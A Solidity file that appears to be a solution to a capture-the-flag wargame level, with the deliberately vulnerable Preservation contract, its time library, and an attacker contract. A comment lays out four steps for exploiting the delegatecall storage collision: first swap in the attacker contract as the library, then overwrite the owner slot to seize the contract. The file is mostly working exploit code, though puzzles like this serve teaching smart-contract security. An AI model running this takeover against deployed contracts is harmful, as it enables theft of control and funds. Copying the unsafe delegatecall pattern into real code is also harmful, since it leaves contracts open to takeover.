// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
  1. Deploy HackerContract.
  2. Convert HackerContract addr to uint (using uint256(_addr) in solidity), let's call it _hacker.
  3. Call setFirstTime(_hacker), this will set timeZone1Library address to HackerContract address as LibraryContract modifies first contract slot.
  4. Now we can modify third slot which is owner address using HackerContract. Convert your address to uint and pass it to setFirstTime(_addr). This 
     will modify the owner in Preservation contract and hence ownership will be claimed!!!!!
*/


contract HackerContract {

  // stores a timestamp 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function setTime(uint _time) public {
    owner = address(_time);
  }
}

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
